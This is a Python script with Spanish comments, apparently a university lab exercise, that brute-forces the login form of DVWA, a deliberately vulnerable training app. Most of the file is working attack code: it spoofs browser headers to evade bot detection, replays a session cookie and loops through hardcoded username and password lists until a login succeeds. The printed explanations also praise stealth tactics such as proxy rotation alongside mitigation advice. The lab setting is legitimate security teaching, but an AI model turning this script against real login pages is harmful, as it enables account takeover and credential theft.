#!/usr/bin/env python3
"""
Script de fuerza bruta para DVWA - Contexto educativo/investigación
Desarrollado para el Laboratorio 2 - Sección 4

Este script demuestra técnicas de ataque de fuerza bruta contra formularios web
utilizando la librería requests de Python. Está diseñado específicamente para
interactuar con DVWA (Damn Vulnerable Web App) en un entorno controlado.

Uso: python3 brute_force_script.py
"""

import requests
import time
import sys

class DVWABruteForcer:
    """
    Clase para realizar ataques de fuerza bruta contra DVWA.
    """
    
    def __init__(self, base_url="http://localhost", phpsessid=None, security="low"):
        """
        Inicializa el atacante de fuerza bruta.
        
        Args:
            base_url (str): URL base de DVWA.
            phpsessid (str): Valor de la cookie PHPSESSID.
            security (str): Nivel de seguridad de DVWA ('low', 'medium', 'high').
        """
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self.login_url = f"{self.base_url}/vulnerabilities/brute/"
        
        # Headers HTTP importantes para simular un navegador real
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
        })
        
        # Configurar la cookie de sesión, que es CRÍTICA para el ataque
        if phpsessid:
            self.session.cookies.set('PHPSESSID', phpsessid)
            self.session.cookies.set('security', security)
    
    def attempt_login(self, username, password):
        """
        Intenta realizar login con credenciales específicas.
        
        Args:
            username (str): Nombre de usuario a probar.
            password (str): Contraseña a probar.
            
        Returns:
            tuple: (bool success, str response_text)
        """
        # Parámetros para el formulario GET de DVWA brute force
        params = {
            'username': username,
            'password': password,
            'Login': 'Login'
        }
        
        try:
            # Realizar petición GET al formulario
            response = self.session.get(self.login_url, params=params, timeout=5)
            response.raise_for_status() # Lanza un error para códigos 4xx/5xx
            
            # Verificar si el login fue exitoso basándose en el contenido de la respuesta
            if "Welcome to the password protected area" in response.text:
                return True, "Login exitoso"
            elif "Username and/or password incorrect" in response.text:
                return False, "Credenciales incorrectas"
            else:
                return False, "Respuesta inesperada del servidor"
                
        except requests.exceptions.Timeout:
            return False, "Error de conexión: Timeout"
        except requests.exceptions.RequestException as e:
            return False, f"Error de conexión: {str(e)}"
    
    def brute_force_attack(self, usernames, passwords, delay=0.2):
        """
        Ejecuta el ataque de fuerza bruta.
        
        Args:
            usernames (list): Lista de nombres de usuario a probar.
            passwords (list): Lista de contraseñas a probar.
            delay (float): Tiempo de espera entre intentos (segundos).
            
        Returns:
            list: Lista de tuplas (username, password) válidas encontradas.
        """
        valid_credentials = []
        total_attempts = len(usernames) * len(passwords)
        current_attempt = 0
        
        print(f"[INFO] Iniciando ataque de fuerza bruta...")
        print(f"[INFO] Usuarios: {len(usernames)}, Contraseñas: {len(passwords)}")
        print(f"[INFO] Total de combinaciones a probar: {total_attempts}")
        print(f"[INFO] URL objetivo: {self.login_url}")
        print(f"[INFO] Delay entre intentos: {delay}s")
        print("-" * 60)
        
        for username in usernames:
            for password in passwords:
                current_attempt += 1
                
                # Barra de progreso simple
                progress = (current_attempt / total_attempts) * 100
                sys.stdout.write(f"\r[{current_attempt:04d}/{total_attempts:04d}] Probando {username}:{password}... {' ' * 20}")
                sys.stdout.flush()

                success, _ = self.attempt_login(username, password)
                
                if success:
                    sys.stdout.write(f"\r{' ' * 80}\r") # Limpiar línea
                    print(f"[SUCCESS] ✓ Credenciales válidas encontradas: {username}:{password}")
                    valid_credentials.append((username, password))
                
                if delay > 0:
                    time.sleep(delay)
        
        print("\n" + "-" * 60)
        return valid_credentials

def print_http_headers_explanation():
    """
    Imprime explicación sobre las cabeceras HTTP utilizadas en el ataque.
    """
    print("\n" + "="*80)
    print("EXPLICACIÓN DE CABECERAS HTTP UTILIZADAS EN EL ATAQUE DE FUERZA BRUTA")
    print("="*80)
    
    headers_info = {
        "User-Agent": {
            "proposito": "Identifica el navegador/cliente que realiza la petición.",
            "importancia": "CRÍTICA. Simula un navegador real para evitar una detección trivial de bots o scripts."
        },
        "Accept": {
            "proposito": "Le dice al servidor qué tipos de contenido (MIME types) puede entender el cliente.",
            "importancia": "Alta. Hace que la petición parezca más legítima, imitando el comportamiento de un navegador estándar."
        },
        "Connection": {
            "proposito": "Controla si la conexión de red se mantiene abierta después de que finalice la transacción actual.",
            "importancia": "Media. Usar 'keep-alive' mejora el rendimiento del ataque al reutilizar la misma conexión TCP para múltiples peticiones."
        },
        "Cookie": {
            "proposito": "Contiene datos de sesión almacenados. En DVWA, gestiona el ID de sesión (PHPSESSID) y el nivel de seguridad.",
            "importancia": "ABSOLUTAMENTE CRÍTICA. Sin una cookie de sesión válida, cada petición sería anónima y el ataque fallaría, ya que el servidor no podría mantener el estado de autenticación."
        }
    }
    
    for header, info in headers_info.items():
        print(f"\n{header}:")
        print(f"  - Propósito: {info['proposito']}")
        print(f"  - Importancia en este ataque: {info['importancia']}")

def print_mitigation_methods():
    """
    Imprime información sobre métodos de mitigación de ataques de fuerza bruta.
    """
    print("\n" + "="*80)
    print("4 MÉTODOS COMUNES PARA PREVENIR/MITIGAR ATAQUES DE FUERZA BRUTA")
    print("="*80)
    
    # ... (El contenido de esta función se puede copiar del borrador original si se desea) ...
    # O se puede dejar una versión resumida como la siguiente:
    
    methods = {
        "1. Rate Limiting y Bloqueo de Cuentas": "Limita el número de intentos de login desde una IP en un tiempo determinado y bloquea la cuenta tras varios fallos.",
        "2. CAPTCHA": "Presenta un desafío que es fácil para humanos pero difícil para bots, usualmente tras detectar varios intentos fallidos.",
        "3. Autenticación de Múltiples Factores (MFA)": "Requiere una segunda forma de verificación además de la contraseña (ej. un código del teléfono), haciendo que la contraseña por sí sola sea inútil.",
        "4. Monitoreo y Análisis de Comportamiento": "Utiliza sistemas (como un WAF) para detectar patrones de ataque anómalos (ej. intentos desde múltiples IPs, horas inusuales) y bloquearlos proactivamente."
    }
    
    for method, description in methods.items():
        print(f"\n{method}:\n  - {description}\n")

def print_performance_comparison():
    """
    Imprime una tabla y análisis comparativo de rendimiento.
    """
    print("\n" + "="*80)
    print("COMPARACIÓN DE RENDIMIENTO DE HERRAMIENTAS")
    print("="*80)
    
    print("""
| Herramienta      | Velocidad | Detección (Sigilo) | Configuración | Flexibilidad |
|------------------|-----------|--------------------|---------------|--------------|
| Script Python    | Media     | Muy Alta           | Alta          | Muy Alta     |
| Hydra            | Muy Alta  | Baja               | Media         | Media        |
| Burp Suite       | Alta      | Alta               | Baja          | Alta         |
| cURL (en script) | Baja      | Muy Alta           | Manual        | Baja         |
    """)
    
    print("""
Análisis Comparativo:
  - Velocidad: Hydra es el rey de la velocidad gracias a su motor multihilo optimizado en C. Burp Suite también es muy rápido. El script de Python es más lento por defecto debido al intérprete, pero puede mejorarse con librerías asíncronas.
  - Detección (Sigilo): El script de Python es el más sigiloso. Permite un control total sobre delays, proxies rotativos y la aleatorización de User-Agents, haciendo el ataque casi indistinguible del tráfico humano. cURL es similarmente sigiloso pero a costa de ser manual. Hydra, por su alta velocidad y patrones de petición predecibles, es el más fácil de detectar por un WAF o un IDS.
  - Flexibilidad: Python gana por goleada. Puede manejar cualquier lógica compleja: CSRF tokens que cambian en cada petición, desafíos JavaScript, o flujos de autenticación de varios pasos. Burp Suite es también muy flexible con sus macros. Hydra está más limitado a escenarios de login estándar.
    """)

def main():
    """
    Función principal del script.
    """
    print("="*80)
    print("SCRIPT DE FUERZA BRUTA - DVWA")
    print("="*80)
    
    # Explicaciones teóricas primero, como lo requiere el informe
    print_http_headers_explanation()
    print_mitigation_methods()
    print_performance_comparison()
    
    print("\n" + "="*80)
    print("EJECUCIÓN DEL ATAQUE DE FUERZA BRUTA")
    print("="*80)
    
    base_url = input("=> Ingrese la URL base de DVWA (ej. http://localhost:8889): ").strip()
    phpsessid = input("=> Ingrese su cookie PHPSESSID: ").strip()
    security = input("=> Ingrese el nivel de seguridad (low/medium/high) [low]: ").strip() or "low"
    
    if not base_url or not phpsessid:
        print("\n[ERROR] La URL base y la cookie PHPSESSID son obligatorias. Abortando.")
        return

    # Listas de usuarios y contraseñas para el ataque
    usernames = ['admin', 'gordonb', '1337', 'pablo', 'smithy']
    passwords = ['password', 'admin', 'letmein', 'qwerty', '123456']
    
    print(f"\n[INFO] Listas cargadas: {len(usernames)} usuarios, {len(passwords)} contraseñas.")
    
    brute_forcer = DVWABruteForcer(base_url, phpsessid, security)
    valid_creds = brute_forcer.brute_force_attack(usernames, passwords)
    
    print("\n" + "="*80)
    print("RESULTADOS DEL ATAQUE")
    print("="*80)
    
    if valid_creds:
        print(f"[SUCCESS] Se encontraron {len(valid_creds)} combinaciones válidas:")
        for i, (username, password) in enumerate(valid_creds, 1):
            print(f"  {i}. Usuario: '{username}' | Contraseña: '{password}'")
    else:
        print("[INFO] No se encontraron credenciales válidas. Verifique:")
        print("  - Que DVWA esté corriendo en la URL especificada.")
        print("  - Que la cookie PHPSESSID sea correcta y no haya expirado.")
        print("  - Que el nivel de seguridad coincida.")
        print("  - Que las credenciales estén en las listas utilizadas.")
    
    print("\n[INFO] Ataque completado.")

if __name__ == "__main__":
    main()
